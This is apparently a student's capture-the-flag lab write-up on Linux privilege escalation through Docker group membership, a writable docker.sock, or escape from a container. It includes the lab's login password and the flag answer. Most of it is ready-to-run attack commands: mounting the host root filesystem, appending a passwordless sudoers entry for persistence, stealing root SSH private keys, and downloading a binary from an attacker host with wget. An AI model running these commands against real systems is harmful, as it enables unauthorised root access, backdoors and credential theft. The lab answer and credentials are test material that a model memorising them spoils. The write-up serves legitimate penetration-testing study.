# Section 15 — Docker

> Lab: `ACADEMY-LLPE-DOCKER` · `ssh htb-student@<T>` (`HTB_@cademy_stdnt!`)
> Sibling of §14 (LXD) / §10 (Privileged Groups). Same idea: container access ⇒ host root.

## ✅ Answer (verified live)

| Q | Answer |
|---|--------|
| Q1 — `/root/flag.txt` via Docker privesc | **`HTB{D0ck3r_Pr1vE5c}`** |

`htb-student` ∈ **`docker`** group → ran a container with host `/` mounted → read `/root/flag.txt` as root.

---

## Triage — which Docker vector?

```bash
id | tr ',' '\n' | grep -i docker          # in the docker group?
ls -la /var/run/docker.sock                # writable socket? (srw-rw---- root docker)
sudo -n -l 2>/dev/null | grep -i docker    # sudo docker?
ls -l $(which docker) 2>/dev/null          # docker SUID?
docker image ls 2>/dev/null; docker ps 2>/dev/null   # usable image / running containers
find / -name 'docker.sock' 2>/dev/null     # non-standard socket (e.g. inside a container at /app/docker.sock)
```
> **Any** of: `docker` group · writable `docker.sock` · `sudo docker` · SUID docker = **root-equivalent**. You also need a usable image (`docker image ls`) or internet to pull one.

---

## Vector A — docker group / sudo / SUID (this box)

Mount host `/` into a container (container-root == host-root) and read/write anything:

```bash
# non-interactive (scriptable - used here):
docker run -v /:/mnt --rm ubuntu cat /mnt/root/flag.txt
# full interactive root on the host FS:
docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
# persistence instead of read:
docker run -v /:/mnt --rm ubuntu sh -c 'echo "htb-student ALL=(ALL) NOPASSWD:ALL" >> /mnt/etc/sudoers'
docker run -v /:/mnt --rm ubuntu sh -c 'cat /mnt/root/.ssh/id_rsa'      # steal root key
# sudo/SUID variants:
sudo docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```
> `-v /:/mnt` bind-mounts the **host root** into the container; the container runs as **root**, so `/mnt/root/...` is fully readable/writable. `--rm` auto-deletes the container (no cleanup). For "submit the flag" just `cat /mnt/root/flag.txt`; for a shell use `chroot /mnt bash`. No image? `docker pull alpine` (if online) or use whatever `docker image ls` shows.

---

## Vector B — writable docker.sock (not in docker group)

If `/var/run/docker.sock` (or a stray `/app/docker.sock` inside a container) is writable but you're not in the group:

```bash
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
# no docker binary? drop a static one and talk to the socket:
wget http://<LH>/docker -O /tmp/docker && chmod +x /tmp/docker
/tmp/docker -H unix:///app/docker.sock ps
/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem <image>
/tmp/docker -H unix:///app/docker.sock exec -it <id> /bin/bash   # -> /hostsystem = host root
# pure-curl fallback (no docker binary at all):
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
```
> The socket *is* the Docker API — write access = full daemon control = root, even without group membership or the CLI (use a uploaded static `docker` or raw `curl --unix-socket`).

---

## Vector C — escaping a container you already shelled

```bash
# look for host paths bind-mounted into the container:
mount | grep -E '/hostsystem|/host|/mnt'; ls -la / | grep -vE 'proc|sys'
cat /hostsystem/home/*/.ssh/id_rsa ; cat /hostsystem/root/.ssh/id_rsa   # steal keys -> ssh in
# check for the docker socket exposed inside the container -> Vector B
ls -la /app/docker.sock /var/run/docker.sock 2>/dev/null
# capability/privileged container checks:
capsh --print 2>/dev/null | grep -i cap_sys_admin   # privileged -> mount host disk, etc.
```
> A misconfigured shared dir (`/hostsystem`) often leaks host SSH keys → `ssh user@host -i stolen.key`. An exposed in-container docker socket → Vector B (container breakout to host root).

---

## Exam / Engagement Notes

- **`id` + `ls -la /var/run/docker.sock` first.** docker group / writable sock / sudo docker / SUID docker = instant root.
- Root one-liner: `docker run -v /:/mnt --rm ubuntu cat /mnt/root/flag.txt` (scriptable) or `... -it ubuntu chroot /mnt bash` (shell). `--rm` = self-cleanup.
- No group but writable socket → `docker -H unix://<sock>` or `curl --unix-socket`.
- Inside a container → check bind-mounts (`mount`/`/hostsystem`) for SSH keys, and for an exposed docker.sock.
- Report note: docker group/socket = root; never grant to interactive/low-trust users; don't expose `docker.sock` into containers.

---

## Lab Walkthrough (quick steps)

```
1. ssh htb-student@<T> ; id  -> groups=...,118(docker)
2. ls -la /var/run/docker.sock ; docker image ls  -> ubuntu:latest available
3. docker run -v /:/mnt --rm ubuntu cat /mnt/root/flag.txt
   -> HTB{D0ck3r_Pr1vE5c}    ✅
   (no cleanup: --rm; full shell alt: docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash)
```

> One line: docker group/socket → run a container with `-v /:/mnt` → you're root on the host FS (`cat /mnt/root/flag.txt`).
